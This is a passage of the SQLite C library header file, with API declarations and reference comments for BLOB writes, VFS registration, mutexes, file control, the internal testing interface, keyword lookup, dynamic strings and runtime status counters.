** caller-supplied buffer. N bytes of data are copied from the buffer Z
** into the open BLOB, starting at offset iOffset.)^
**
** ^(On success, sqlite3_blob_write() returns SQLITE_OK.
** Otherwise, an  [error code] or an [extended error code] is returned.)^
** ^Unless SQLITE_MISUSE is returned, this function sets the 
** [database connection] error code and message accessible via 
** [sqlite3_errcode()] and [sqlite3_errmsg()] and related functions. 
**
** ^If the [BLOB handle] passed as the first argument was not opened for
** writing (the flags parameter to [sqlite3_blob_open()] was zero),
** this function returns [SQLITE_READONLY].
**
** This function may only modify the contents of the BLOB; it is
** not possible to increase the size of a BLOB using this API.
** ^If offset iOffset is less than N bytes from the end of the BLOB,
** [SQLITE_ERROR] is returned and no data is written. The size of the 
** BLOB (and hence the maximum value of N+iOffset) can be determined 
** using the [sqlite3_blob_bytes()] interface. ^If N or iOffset are less 
** than zero [SQLITE_ERROR] is returned and no data is written.
**
** ^An attempt to write to an expired [BLOB handle] fails with an
** error code of [SQLITE_ABORT].  ^Writes to the BLOB that occurred
** before the [BLOB handle] expired are not rolled back by the
** expiration of the handle, though of course those changes might
** have been overwritten by the statement that expired the BLOB handle
** or by other independent statements.
**
** This routine only works on a [BLOB handle] which has been created
** by a prior successful call to [sqlite3_blob_open()] and which has not
** been closed by [sqlite3_blob_close()].  Passing any other pointer in
** to this routine results in undefined and probably undesirable behavior.
**
** See also: [sqlite3_blob_read()].
*/
SQLITE_API int sqlite3_blob_write(sqlite3_blob *, const void *z, int n, int iOffset);

/*
** CAPI3REF: Virtual File System Objects
**
** A virtual filesystem (VFS) is an [sqlite3_vfs] object
** that SQLite uses to interact
** with the underlying operating system.  Most SQLite builds come with a
** single default VFS that is appropriate for the host computer.
** New VFSes can be registered and existing VFSes can be unregistered.
** The following interfaces are provided.
**
** ^The sqlite3_vfs_find() interface returns a pointer to a VFS given its name.
** ^Names are case sensitive.
** ^Names are zero-terminated UTF-8 strings.
** ^If there is no match, a NULL pointer is returned.
** ^If zVfsName is NULL then the default VFS is returned.
**
** ^New VFSes are registered with sqlite3_vfs_register().
** ^Each new VFS becomes the default VFS if the makeDflt flag is set.
** ^The same VFS can be registered multiple times without injury.
** ^To make an existing VFS into the default VFS, register it again
** with the makeDflt flag set.  If two different VFSes with the
** same name are registered, the behavior is undefined.  If a
** VFS is registered with a name that is NULL or an empty string,
** then the behavior is undefined.
**
** ^Unregister a VFS with the sqlite3_vfs_unregister() interface.
** ^(If the default VFS is unregistered, another VFS is chosen as
** the default.  The choice for the new VFS is arbitrary.)^
*/
SQLITE_API sqlite3_vfs *sqlite3_vfs_find(const char *zVfsName);
SQLITE_API int sqlite3_vfs_register(sqlite3_vfs*, int makeDflt);
SQLITE_API int sqlite3_vfs_unregister(sqlite3_vfs*);

/*
** CAPI3REF: Mutexes
**
** The SQLite core uses these routines for thread
** synchronization. Though they are intended for internal
** use by SQLite, code that links against SQLite is
** permitted to use any of these routines.
**
** The SQLite source code contains multiple implementations
** of these mutex routines.  An appropriate implementation
** is selected automatically at compile-time.  The following
** implementations are available in the SQLite core:
**
** <ul>
** <li>   SQLITE_MUTEX_PTHREADS
** <li>   SQLITE_MUTEX_W32
** <li>   SQLITE_MUTEX_NOOP
** </ul>
**
** The SQLITE_MUTEX_NOOP implementation is a set of routines
** that does no real locking and is appropriate for use in
** a single-threaded application.  The SQLITE_MUTEX_PTHREADS and
** SQLITE_MUTEX_W32 implementations are appropriate for use on Unix
** and Windows.
**
** If SQLite is compiled with the SQLITE_MUTEX_APPDEF preprocessor
** macro defined (with "-DSQLITE_MUTEX_APPDEF=1"), then no mutex
** implementation is included with the library. In this case the
** application must supply a custom mutex implementation using the
** [SQLITE_CONFIG_MUTEX] option of the sqlite3_config() function
** before calling sqlite3_initialize() or any other public sqlite3_
** function that calls sqlite3_initialize().
**
** ^The sqlite3_mutex_alloc() routine allocates a new
** mutex and returns a pointer to it. ^The sqlite3_mutex_alloc()
** routine returns NULL if it is unable to allocate the requested
** mutex.  The argument to sqlite3_mutex_alloc() must one of these
** integer constants:
**
** <ul>
** <li>  SQLITE_MUTEX_FAST
** <li>  SQLITE_MUTEX_RECURSIVE
** <li>  SQLITE_MUTEX_STATIC_MASTER
** <li>  SQLITE_MUTEX_STATIC_MEM
** <li>  SQLITE_MUTEX_STATIC_OPEN
** <li>  SQLITE_MUTEX_STATIC_PRNG
** <li>  SQLITE_MUTEX_STATIC_LRU
** <li>  SQLITE_MUTEX_STATIC_PMEM
** <li>  SQLITE_MUTEX_STATIC_APP1
** <li>  SQLITE_MUTEX_STATIC_APP2
** <li>  SQLITE_MUTEX_STATIC_APP3
** <li>  SQLITE_MUTEX_STATIC_VFS1
** <li>  SQLITE_MUTEX_STATIC_VFS2
** <li>  SQLITE_MUTEX_STATIC_VFS3
** </ul>
**
** ^The first two constants (SQLITE_MUTEX_FAST and SQLITE_MUTEX_RECURSIVE)
** cause sqlite3_mutex_alloc() to create
** a new mutex.  ^The new mutex is recursive when SQLITE_MUTEX_RECURSIVE
** is used but not necessarily so when SQLITE_MUTEX_FAST is used.
** The mutex implementation does not need to make a distinction
** between SQLITE_MUTEX_RECURSIVE and SQLITE_MUTEX_FAST if it does
** not want to.  SQLite will only request a recursive mutex in
** cases where it really needs one.  If a faster non-recursive mutex
** implementation is available on the host platform, the mutex subsystem
** might return such a mutex in response to SQLITE_MUTEX_FAST.
**
** ^The other allowed parameters to sqlite3_mutex_alloc() (anything other
** than SQLITE_MUTEX_FAST and SQLITE_MUTEX_RECURSIVE) each return
** a pointer to a static preexisting mutex.  ^Nine static mutexes are
** used by the current version of SQLite.  Future versions of SQLite
** may add additional static mutexes.  Static mutexes are for internal
** use by SQLite only.  Applications that use SQLite mutexes should
** use only the dynamic mutexes returned by SQLITE_MUTEX_FAST or
** SQLITE_MUTEX_RECURSIVE.
**
** ^Note that if one of the dynamic mutex parameters (SQLITE_MUTEX_FAST
** or SQLITE_MUTEX_RECURSIVE) is used then sqlite3_mutex_alloc()
** returns a different mutex on every call.  ^For the static
** mutex types, the same mutex is returned on every call that has
** the same type number.
**
** ^The sqlite3_mutex_free() routine deallocates a previously
** allocated dynamic mutex.  Attempting to deallocate a static
** mutex results in undefined behavior.
**
** ^The sqlite3_mutex_enter() and sqlite3_mutex_try() routines attempt
** to enter a mutex.  ^If another thread is already within the mutex,
** sqlite3_mutex_enter() will block and sqlite3_mutex_try() will return
** SQLITE_BUSY.  ^The sqlite3_mutex_try() interface returns [SQLITE_OK]
** upon successful entry.  ^(Mutexes created using
** SQLITE_MUTEX_RECURSIVE can be entered multiple times by the same thread.
** In such cases, the
** mutex must be exited an equal number of times before another thread
** can enter.)^  If the same thread tries to enter any mutex other
** than an SQLITE_MUTEX_RECURSIVE more than once, the behavior is undefined.
**
** ^(Some systems (for example, Windows 95) do not support the operation
** implemented by sqlite3_mutex_try().  On those systems, sqlite3_mutex_try()
** will always return SQLITE_BUSY. The SQLite core only ever uses
** sqlite3_mutex_try() as an optimization so this is acceptable 
** behavior.)^
**
** ^The sqlite3_mutex_leave() routine exits a mutex that was
** previously entered by the same thread.   The behavior
** is undefined if the mutex is not currently entered by the
** calling thread or is not currently allocated.
**
** ^If the argument to sqlite3_mutex_enter(), sqlite3_mutex_try(), or
** sqlite3_mutex_leave() is a NULL pointer, then all three routines
** behave as no-ops.
**
** See also: [sqlite3_mutex_held()] and [sqlite3_mutex_notheld()].
*/
SQLITE_API sqlite3_mutex *sqlite3_mutex_alloc(int);
SQLITE_API void sqlite3_mutex_free(sqlite3_mutex*);
SQLITE_API void sqlite3_mutex_enter(sqlite3_mutex*);
SQLITE_API int sqlite3_mutex_try(sqlite3_mutex*);
SQLITE_API void sqlite3_mutex_leave(sqlite3_mutex*);

/*
** CAPI3REF: Mutex Methods Object
**
** An instance of this structure defines the low-level routines
** used to allocate and use mutexes.
**
** Usually, the default mutex implementations provided by SQLite are
** sufficient, however the application has the option of substituting a custom
** implementation for specialized deployments or systems for which SQLite
** does not provide a suitable implementation. In this case, the application
** creates and populates an instance of this structure to pass
** to sqlite3_config() along with the [SQLITE_CONFIG_MUTEX] option.
** Additionally, an instance of this structure can be used as an
** output variable when querying the system for the current mutex
** implementation, using the [SQLITE_CONFIG_GETMUTEX] option.
**
** ^The xMutexInit method defined by this structure is invoked as
** part of system initialization by the sqlite3_initialize() function.
** ^The xMutexInit routine is called by SQLite exactly once for each
** effective call to [sqlite3_initialize()].
**
** ^The xMutexEnd method defined by this structure is invoked as
** part of system shutdown by the sqlite3_shutdown() function. The
** implementation of this method is expected to release all outstanding
** resources obtained by the mutex methods implementation, especially
** those obtained by the xMutexInit method.  ^The xMutexEnd()
** interface is invoked exactly once for each call to [sqlite3_shutdown()].
**
** ^(The remaining seven methods defined by this structure (xMutexAlloc,
** xMutexFree, xMutexEnter, xMutexTry, xMutexLeave, xMutexHeld and
** xMutexNotheld) implement the following interfaces (respectively):
**
** <ul>
**   <li>  [sqlite3_mutex_alloc()] </li>
**   <li>  [sqlite3_mutex_free()] </li>
**   <li>  [sqlite3_mutex_enter()] </li>
**   <li>  [sqlite3_mutex_try()] </li>
**   <li>  [sqlite3_mutex_leave()] </li>
**   <li>  [sqlite3_mutex_held()] </li>
**   <li>  [sqlite3_mutex_notheld()] </li>
** </ul>)^
**
** The only difference is that the public sqlite3_XXX functions enumerated
** above silently ignore any invocations that pass a NULL pointer instead
** of a valid mutex handle. The implementations of the methods defined
** by this structure are not required to handle this case, the results
** of passing a NULL pointer instead of a valid mutex handle are undefined
** (i.e. it is acceptable to provide an implementation that segfaults if
** it is passed a NULL pointer).
**
** The xMutexInit() method must be threadsafe.  It must be harmless to
** invoke xMutexInit() multiple times within the same process and without
** intervening calls to xMutexEnd().  Second and subsequent calls to
** xMutexInit() must be no-ops.
**
** xMutexInit() must not use SQLite memory allocation ([sqlite3_malloc()]
** and its associates).  Similarly, xMutexAlloc() must not use SQLite memory
** allocation for a static mutex.  ^However xMutexAlloc() may use SQLite
** memory allocation for a fast or recursive mutex.
**
** ^SQLite will invoke the xMutexEnd() method when [sqlite3_shutdown()] is
** called, but only if the prior call to xMutexInit returned SQLITE_OK.
** If xMutexInit fails in any way, it is expected to clean up after itself
** prior to returning.
*/
typedef struct sqlite3_mutex_methods sqlite3_mutex_methods;
struct sqlite3_mutex_methods {
  int (*xMutexInit)(void);
  int (*xMutexEnd)(void);
  sqlite3_mutex *(*xMutexAlloc)(int);
  void (*xMutexFree)(sqlite3_mutex *);
  void (*xMutexEnter)(sqlite3_mutex *);
  int (*xMutexTry)(sqlite3_mutex *);
  void (*xMutexLeave)(sqlite3_mutex *);
  int (*xMutexHeld)(sqlite3_mutex *);
  int (*xMutexNotheld)(sqlite3_mutex *);
};

/*
** CAPI3REF: Mutex Verification Routines
**
** The sqlite3_mutex_held() and sqlite3_mutex_notheld() routines
** are intended for use inside assert() statements.  The SQLite core
** never uses these routines except inside an assert() and applications
** are advised to follow the lead of the core.  The SQLite core only
** provides implementations for these routines when it is compiled
** with the SQLITE_DEBUG flag.  External mutex implementations
** are only required to provide these routines if SQLITE_DEBUG is
** defined and if NDEBUG is not defined.
**
** These routines should return true if the mutex in their argument
** is held or not held, respectively, by the calling thread.
**
** The implementation is not required to provide versions of these
** routines that actually work. If the implementation does not provide working
** versions of these routines, it should at least provide stubs that always
** return true so that one does not get spurious assertion failures.
**
** If the argument to sqlite3_mutex_held() is a NULL pointer then
** the routine should return 1.   This seems counter-intuitive since
** clearly the mutex cannot be held if it does not exist.  But
** the reason the mutex does not exist is because the build is not
** using mutexes.  And we do not want the assert() containing the
** call to sqlite3_mutex_held() to fail, so a non-zero return is
** the appropriate thing to do.  The sqlite3_mutex_notheld()
** interface should also return 1 when given a NULL pointer.
*/
#ifndef NDEBUG
SQLITE_API int sqlite3_mutex_held(sqlite3_mutex*);
SQLITE_API int sqlite3_mutex_notheld(sqlite3_mutex*);
#endif

/*
** CAPI3REF: Mutex Types
**
** The [sqlite3_mutex_alloc()] interface takes a single argument
** which is one of these integer constants.
**
** The set of static mutexes may change from one SQLite release to the
** next.  Applications that override the built-in mutex logic must be
** prepared to accommodate additional static mutexes.
*/
#define SQLITE_MUTEX_FAST             0
#define SQLITE_MUTEX_RECURSIVE        1
#define SQLITE_MUTEX_STATIC_MASTER    2
#define SQLITE_MUTEX_STATIC_MEM       3  /* sqlite3_malloc() */
#define SQLITE_MUTEX_STATIC_MEM2      4  /* NOT USED */
#define SQLITE_MUTEX_STATIC_OPEN      4  /* sqlite3BtreeOpen() */
#define SQLITE_MUTEX_STATIC_PRNG      5  /* sqlite3_randomness() */
#define SQLITE_MUTEX_STATIC_LRU       6  /* lru page list */
#define SQLITE_MUTEX_STATIC_LRU2      7  /* NOT USED */
#define SQLITE_MUTEX_STATIC_PMEM      7  /* sqlite3PageMalloc() */
#define SQLITE_MUTEX_STATIC_APP1      8  /* For use by application */
#define SQLITE_MUTEX_STATIC_APP2      9  /* For use by application */
#define SQLITE_MUTEX_STATIC_APP3     10  /* For use by application */
#define SQLITE_MUTEX_STATIC_VFS1     11  /* For use by built-in VFS */
#define SQLITE_MUTEX_STATIC_VFS2     12  /* For use by extension VFS */
#define SQLITE_MUTEX_STATIC_VFS3     13  /* For use by application VFS */

/*
** CAPI3REF: Retrieve the mutex for a database connection
** METHOD: sqlite3
**
** ^This interface returns a pointer the [sqlite3_mutex] object that 
** serializes access to the [database connection] given in the argument
** when the [threading mode] is Serialized.
** ^If the [threading mode] is Single-thread or Multi-thread then this
** routine returns a NULL pointer.
*/
SQLITE_API sqlite3_mutex *sqlite3_db_mutex(sqlite3*);

/*
** CAPI3REF: Low-Level Control Of Database Files
** METHOD: sqlite3
** KEYWORDS: {file control}
**
** ^The [sqlite3_file_control()] interface makes a direct call to the
** xFileControl method for the [sqlite3_io_methods] object associated
** with a particular database identified by the second argument. ^The
** name of the database is "main" for the main database or "temp" for the
** TEMP database, or the name that appears after the AS keyword for
** databases that are added using the [ATTACH] SQL command.
** ^A NULL pointer can be used in place of "main" to refer to the
** main database file.
** ^The third and fourth parameters to this routine
** are passed directly through to the second and third parameters of
** the xFileControl method.  ^The return value of the xFileControl
** method becomes the return value of this routine.
**
** A few opcodes for [sqlite3_file_control()] are handled directly
** by the SQLite core and never invoke the 
** sqlite3_io_methods.xFileControl method.
** ^The [SQLITE_FCNTL_FILE_POINTER] value for the op parameter causes
** a pointer to the underlying [sqlite3_file] object to be written into
** the space pointed to by the 4th parameter.  The
** [SQLITE_FCNTL_JOURNAL_POINTER] works similarly except that it returns
** the [sqlite3_file] object associated with the journal file instead of
** the main database.  The [SQLITE_FCNTL_VFS_POINTER] opcode returns
** a pointer to the underlying [sqlite3_vfs] object for the file.
** The [SQLITE_FCNTL_DATA_VERSION] returns the data version counter
** from the pager.
**
** ^If the second parameter (zDbName) does not match the name of any
** open database file, then SQLITE_ERROR is returned.  ^This error
** code is not remembered and will not be recalled by [sqlite3_errcode()]
** or [sqlite3_errmsg()].  The underlying xFileControl method might
** also return SQLITE_ERROR.  There is no way to distinguish between
** an incorrect zDbName and an SQLITE_ERROR return from the underlying
** xFileControl method.
**
** See also: [file control opcodes]
*/
SQLITE_API int sqlite3_file_control(sqlite3*, const char *zDbName, int op, void*);

/*
** CAPI3REF: Testing Interface
**
** ^The sqlite3_test_control() interface is used to read out internal
** state of SQLite and to inject faults into SQLite for testing
** purposes.  ^The first parameter is an operation code that determines
** the number, meaning, and operation of all subsequent parameters.
**
** This interface is not for use by applications.  It exists solely
** for verifying the correct operation of the SQLite library.  Depending
** on how the SQLite library is compiled, this interface might not exist.
**
** The details of the operation codes, their meanings, the parameters
** they take, and what they do are all subject to change without notice.
** Unlike most of the SQLite API, this function is not guaranteed to
** operate consistently from one release to the next.
*/
SQLITE_API int sqlite3_test_control(int op, ...);

/*
** CAPI3REF: Testing Interface Operation Codes
**
** These constants are the valid operation code parameters used
** as the first argument to [sqlite3_test_control()].
**
** These parameters and their meanings are subject to change
** without notice.  These values are for testing purposes only.
** Applications should not use any of these parameters or the
** [sqlite3_test_control()] interface.
*/
#define SQLITE_TESTCTRL_FIRST                    5
#define SQLITE_TESTCTRL_PRNG_SAVE                5
#define SQLITE_TESTCTRL_PRNG_RESTORE             6
#define SQLITE_TESTCTRL_PRNG_RESET               7  /* NOT USED */
#define SQLITE_TESTCTRL_BITVEC_TEST              8
#define SQLITE_TESTCTRL_FAULT_INSTALL            9
#define SQLITE_TESTCTRL_BENIGN_MALLOC_HOOKS     10
#define SQLITE_TESTCTRL_PENDING_BYTE            11
#define SQLITE_TESTCTRL_ASSERT                  12
#define SQLITE_TESTCTRL_ALWAYS                  13
#define SQLITE_TESTCTRL_RESERVE                 14
#define SQLITE_TESTCTRL_OPTIMIZATIONS           15
#define SQLITE_TESTCTRL_ISKEYWORD               16  /* NOT USED */
#define SQLITE_TESTCTRL_SCRATCHMALLOC           17  /* NOT USED */
#define SQLITE_TESTCTRL_INTERNAL_FUNCTIONS      17
#define SQLITE_TESTCTRL_LOCALTIME_FAULT         18
#define SQLITE_TESTCTRL_EXPLAIN_STMT            19  /* NOT USED */
#define SQLITE_TESTCTRL_ONCE_RESET_THRESHOLD    19
#define SQLITE_TESTCTRL_NEVER_CORRUPT           20
#define SQLITE_TESTCTRL_VDBE_COVERAGE           21
#define SQLITE_TESTCTRL_BYTEORDER               22
#define SQLITE_TESTCTRL_ISINIT                  23
#define SQLITE_TESTCTRL_SORTER_MMAP             24
#define SQLITE_TESTCTRL_IMPOSTER                25
#define SQLITE_TESTCTRL_PARSER_COVERAGE         26
#define SQLITE_TESTCTRL_RESULT_INTREAL          27
#define SQLITE_TESTCTRL_PRNG_SEED               28
#define SQLITE_TESTCTRL_EXTRA_SCHEMA_CHECKS     29
#define SQLITE_TESTCTRL_LAST                    29  /* Largest TESTCTRL */

/*
** CAPI3REF: SQL Keyword Checking
**
** These routines provide access to the set of SQL language keywords 
** recognized by SQLite.  Applications can uses these routines to determine
** whether or not a specific identifier needs to be escaped (for example,
** by enclosing in double-quotes) so as not to confuse the parser.
**
** The sqlite3_keyword_count() interface returns the number of distinct
** keywords understood by SQLite.
**
** The sqlite3_keyword_name(N,Z,L) interface finds the N-th keyword and
** makes *Z point to that keyword expressed as UTF8 and writes the number
** of bytes in the keyword into *L.  The string that *Z points to is not
** zero-terminated.  The sqlite3_keyword_name(N,Z,L) routine returns
** SQLITE_OK if N is within bounds and SQLITE_ERROR if not. If either Z
** or L are NULL or invalid pointers then calls to
** sqlite3_keyword_name(N,Z,L) result in undefined behavior.
**
** The sqlite3_keyword_check(Z,L) interface checks to see whether or not
** the L-byte UTF8 identifier that Z points to is a keyword, returning non-zero
** if it is and zero if not.
**
** The parser used by SQLite is forgiving.  It is often possible to use
** a keyword as an identifier as long as such use does not result in a
** parsing ambiguity.  For example, the statement
** "CREATE TABLE BEGIN(REPLACE,PRAGMA,END);" is accepted by SQLite, and
** creates a new table named "BEGIN" with three columns named
** "REPLACE", "PRAGMA", and "END".  Nevertheless, best practice is to avoid
** using keywords as identifiers.  Common techniques used to avoid keyword
** name collisions include:
** <ul>
** <li> Put all identifier names inside double-quotes.  This is the official
**      SQL way to escape identifier names.
** <li> Put identifier names inside &#91;...&#93;.  This is not standard SQL,
**      but it is what SQL Server does and so lots of programmers use this
**      technique.
** <li> Begin every identifier with the letter "Z" as no SQL keywords start
**      with "Z".
** <li> Include a digit somewhere in every identifier name.
** </ul>
**
** Note that the number of keywords understood by SQLite can depend on
** compile-time options.  For example, "VACUUM" is not a keyword if
** SQLite is compiled with the [-DSQLITE_OMIT_VACUUM] option.  Also,
** new keywords may be added to future releases of SQLite.
*/
SQLITE_API int sqlite3_keyword_count(void);
SQLITE_API int sqlite3_keyword_name(int,const char**,int*);
SQLITE_API int sqlite3_keyword_check(const char*,int);

/*
** CAPI3REF: Dynamic String Object
** KEYWORDS: {dynamic string}
**
** An instance of the sqlite3_str object contains a dynamically-sized
** string under construction.
**
** The lifecycle of an sqlite3_str object is as follows:
** <ol>
** <li> ^The sqlite3_str object is created using [sqlite3_str_new()].
** <li> ^Text is appended to the sqlite3_str object using various
** methods, such as [sqlite3_str_appendf()].
** <li> ^The sqlite3_str object is destroyed and the string it created
** is returned using the [sqlite3_str_finish()] interface.
** </ol>
*/
typedef struct sqlite3_str sqlite3_str;

/*
** CAPI3REF: Create A New Dynamic String Object
** CONSTRUCTOR: sqlite3_str
**
** ^The [sqlite3_str_new(D)] interface allocates and initializes
** a new [sqlite3_str] object.  To avoid memory leaks, the object returned by
** [sqlite3_str_new()] must be freed by a subsequent call to 
** [sqlite3_str_finish(X)].
**
** ^The [sqlite3_str_new(D)] interface always returns a pointer to a
** valid [sqlite3_str] object, though in the event of an out-of-memory
** error the returned object might be a special singleton that will
** silently reject new text, always return SQLITE_NOMEM from 
** [sqlite3_str_errcode()], always return 0 for 
** [sqlite3_str_length()], and always return NULL from
** [sqlite3_str_finish(X)].  It is always safe to use the value
** returned by [sqlite3_str_new(D)] as the sqlite3_str parameter
** to any of the other [sqlite3_str] methods.
**
** The D parameter to [sqlite3_str_new(D)] may be NULL.  If the
** D parameter in [sqlite3_str_new(D)] is not NULL, then the maximum
** length of the string contained in the [sqlite3_str] object will be
** the value set for [sqlite3_limit](D,[SQLITE_LIMIT_LENGTH]) instead
** of [SQLITE_MAX_LENGTH].
*/
SQLITE_API sqlite3_str *sqlite3_str_new(sqlite3*);

/*
** CAPI3REF: Finalize A Dynamic String
** DESTRUCTOR: sqlite3_str
**
** ^The [sqlite3_str_finish(X)] interface destroys the sqlite3_str object X
** and returns a pointer to a memory buffer obtained from [sqlite3_malloc64()]
** that contains the constructed string.  The calling application should
** pass the returned value to [sqlite3_free()] to avoid a memory leak.
** ^The [sqlite3_str_finish(X)] interface may return a NULL pointer if any
** errors were encountered during construction of the string.  ^The
** [sqlite3_str_finish(X)] interface will also return a NULL pointer if the
** string in [sqlite3_str] object X is zero bytes long.
*/
SQLITE_API char *sqlite3_str_finish(sqlite3_str*);

/*
** CAPI3REF: Add Content To A Dynamic String
** METHOD: sqlite3_str
**
** These interfaces add content to an sqlite3_str object previously obtained
** from [sqlite3_str_new()].
**
** ^The [sqlite3_str_appendf(X,F,...)] and 
** [sqlite3_str_vappendf(X,F,V)] interfaces uses the [built-in printf]
** functionality of SQLite to append formatted text onto the end of 
** [sqlite3_str] object X.
**
** ^The [sqlite3_str_append(X,S,N)] method appends exactly N bytes from string S
** onto the end of the [sqlite3_str] object X.  N must be non-negative.
** S must contain at least N non-zero bytes of content.  To append a
** zero-terminated string in its entirety, use the [sqlite3_str_appendall()]
** method instead.
**
** ^The [sqlite3_str_appendall(X,S)] method appends the complete content of
** zero-terminated string S onto the end of [sqlite3_str] object X.
**
** ^The [sqlite3_str_appendchar(X,N,C)] method appends N copies of the
** single-byte character C onto the end of [sqlite3_str] object X.
** ^This method can be used, for example, to add whitespace indentation.
**
** ^The [sqlite3_str_reset(X)] method resets the string under construction
** inside [sqlite3_str] object X back to zero bytes in length.  
**
** These methods do not return a result code.  ^If an error occurs, that fact
** is recorded in the [sqlite3_str] object and can be recovered by a
** subsequent call to [sqlite3_str_errcode(X)].
*/
SQLITE_API void sqlite3_str_appendf(sqlite3_str*, const char *zFormat, ...);
SQLITE_API void sqlite3_str_vappendf(sqlite3_str*, const char *zFormat, va_list);
SQLITE_API void sqlite3_str_append(sqlite3_str*, const char *zIn, int N);
SQLITE_API void sqlite3_str_appendall(sqlite3_str*, const char *zIn);
SQLITE_API void sqlite3_str_appendchar(sqlite3_str*, int N, char C);
SQLITE_API void sqlite3_str_reset(sqlite3_str*);

/*
** CAPI3REF: Status Of A Dynamic String
** METHOD: sqlite3_str
**
** These interfaces return the current status of an [sqlite3_str] object.
**
** ^If any prior errors have occurred while constructing the dynamic string
** in sqlite3_str X, then the [sqlite3_str_errcode(X)] method will return
** an appropriate error code.  ^The [sqlite3_str_errcode(X)] method returns
** [SQLITE_NOMEM] following any out-of-memory error, or
** [SQLITE_TOOBIG] if the size of the dynamic string exceeds
** [SQLITE_MAX_LENGTH], or [SQLITE_OK] if there have been no errors.
**
** ^The [sqlite3_str_length(X)] method returns the current length, in bytes,
** of the dynamic string under construction in [sqlite3_str] object X.
** ^The length returned by [sqlite3_str_length(X)] does not include the
** zero-termination byte.
**
** ^The [sqlite3_str_value(X)] method returns a pointer to the current
** content of the dynamic string under construction in X.  The value
** returned by [sqlite3_str_value(X)] is managed by the sqlite3_str object X
** and might be freed or altered by any subsequent method on the same
** [sqlite3_str] object.  Applications must not used the pointer returned
** [sqlite3_str_value(X)] after any subsequent method call on the same
** object.  ^Applications may change the content of the string returned
** by [sqlite3_str_value(X)] as long as they do not write into any bytes
** outside the range of 0 to [sqlite3_str_length(X)] and do not read or
** write any byte after any subsequent sqlite3_str method call.
*/
SQLITE_API int sqlite3_str_errcode(sqlite3_str*);
SQLITE_API int sqlite3_str_length(sqlite3_str*);
SQLITE_API char *sqlite3_str_value(sqlite3_str*);

/*
** CAPI3REF: SQLite Runtime Status
**
** ^These interfaces are used to retrieve runtime status information
** about the performance of SQLite, and optionally to reset various
** highwater marks.  ^The first argument is an integer code for
** the specific parameter to measure.  ^(Recognized integer codes
** are of the form [status parameters | SQLITE_STATUS_...].)^
** ^The current value of the parameter is returned into *pCurrent.
** ^The highest recorded value is returned in *pHighwater.  ^If the
** resetFlag is true, then the highest record value is reset after
** *pHighwater is written.  ^(Some parameters do not record the highest
** value.  For those parameters
** nothing is written into *pHighwater and the resetFlag is ignored.)^
** ^(Other parameters record only the highwater mark and not the current
** value.  For these latter parameters nothing is written into *pCurrent.)^
**
** ^The sqlite3_status() and sqlite3_status64() routines return
** SQLITE_OK on success and a non-zero [error code] on failure.
**
** If either the current value or the highwater mark is too large to
** be represented by a 32-bit integer, then the values returned by
** sqlite3_status() are undefined.
**
** See also: [sqlite3_db_status()]
*/
SQLITE_API int sqlite3_status(int op, int *pCurrent, int *pHighwater, int resetFlag);
SQLITE_API int sqlite3_status64(
  int op,
  sqlite3_int64 *pCurrent,
  sqlite3_int64 *pHighwater,
  int resetFlag
);


/*
** CAPI3REF: Status Parameters
** KEYWORDS: {status parameters}
**
** These integer constants designate various run-time status parameters
** that can be returned by [sqlite3_status()].
**
** <dl>
** [[SQLITE_STATUS_MEMORY_USED]] ^(<dt>SQLITE_STATUS_MEMORY_USED</dt>
** <dd>This parameter is the current amount of memory checked out
** using [sqlite3_malloc()], either directly or indirectly.  The
** figure includes calls made to [sqlite3_malloc()] by the application
** and internal memory usage by the SQLite library.  Auxiliary page-cache
** memory controlled by [SQLITE_CONFIG_PAGECACHE] is not included in
** this parameter.  The amount returned is the sum of the allocation
** sizes as reported by the xSize method in [sqlite3_mem_methods].</dd>)^
**
** [[SQLITE_STATUS_MALLOC_SIZE]] ^(<dt>SQLITE_STATUS_MALLOC_SIZE</dt>
** <dd>This parameter records the largest memory allocation request
** handed to [sqlite3_malloc()] or [sqlite3_realloc()] (or their
** internal equivalents).  Only the value returned in the
** *pHighwater parameter to [sqlite3_status()] is of interest.  
** The value written into the *pCurrent parameter is undefined.</dd>)^
**
** [[SQLITE_STATUS_MALLOC_COUNT]] ^(<dt>SQLITE_STATUS_MALLOC_COUNT</dt>
** <dd>This parameter records the number of separate memory allocations
** currently checked out.</dd>)^
**
** [[SQLITE_STATUS_PAGECACHE_USED]] ^(<dt>SQLITE_STATUS_PAGECACHE_USED</dt>
** <dd>This parameter returns the number of pages used out of the
** [pagecache memory allocator] that was configured using 
** [SQLITE_CONFIG_PAGECACHE].  The
** value returned is in pages, not in bytes.</dd>)^
**
** [[SQLITE_STATUS_PAGECACHE_OVERFLOW]] 
** ^(<dt>SQLITE_STATUS_PAGECACHE_OVERFLOW</dt>
** <dd>This parameter returns the number of bytes of page cache
** allocation which could not be satisfied by the [SQLITE_CONFIG_PAGECACHE]
** buffer and where forced to overflow to [sqlite3_malloc()].  The
** returned value includes allocations that overflowed because they
** where too large (they were larger than the "sz" parameter to
** [SQLITE_CONFIG_PAGECACHE]) and allocations that overflowed because
** no space was left in the page cache.</dd>)^
**
** [[SQLITE_STATUS_PAGECACHE_SIZE]] ^(<dt>SQLITE_STATUS_PAGECACHE_SIZE</dt>
** <dd>This parameter records the largest memory allocation request
** handed to [pagecache memory allocator].  Only the value returned in the
** *pHighwater parameter to [sqlite3_status()] is of interest.  
** The value written into the *pCurrent parameter is undefined.</dd>)^
**
** [[SQLITE_STATUS_SCRATCH_USED]] <dt>SQLITE_STATUS_SCRATCH_USED</dt>
** <dd>No longer used.</dd>
**
** [[SQLITE_STATUS_SCRATCH_OVERFLOW]] ^(<dt>SQLITE_STATUS_SCRATCH_OVERFLOW</dt>
** <dd>No longer used.</dd>
**
** [[SQLITE_STATUS_SCRATCH_SIZE]] <dt>SQLITE_STATUS_SCRATCH_SIZE</dt>
** <dd>No longer used.</dd>
**
** [[SQLITE_STATUS_PARSER_STACK]] ^(<dt>SQLITE_STATUS_PARSER_STACK</dt>
** <dd>The *pHighwater parameter records the deepest parser stack. 
** The *pCurrent value is undefined.  The *pHighwater value is only
** meaningful if SQLite is compiled with [YYTRACKMAXSTACKDEPTH].</dd>)^
** </dl>
**
** New status parameters may be added from time to time.
*/
#define SQLITE_STATUS_MEMORY_USED          0
#define SQLITE_STATUS_PAGECACHE_USED       1
#define SQLITE_STATUS_PAGECACHE_OVERFLOW   2
#define SQLITE_STATUS_SCRATCH_USED         3  /* NOT USED */
#define SQLITE_STATUS_SCRATCH_OVERFLOW     4  /* NOT USED */
#define SQLITE_STATUS_MALLOC_SIZE          5
#define SQLITE_STATUS_PARSER_STACK         6
#define SQLITE_STATUS_PAGECACHE_SIZE       7
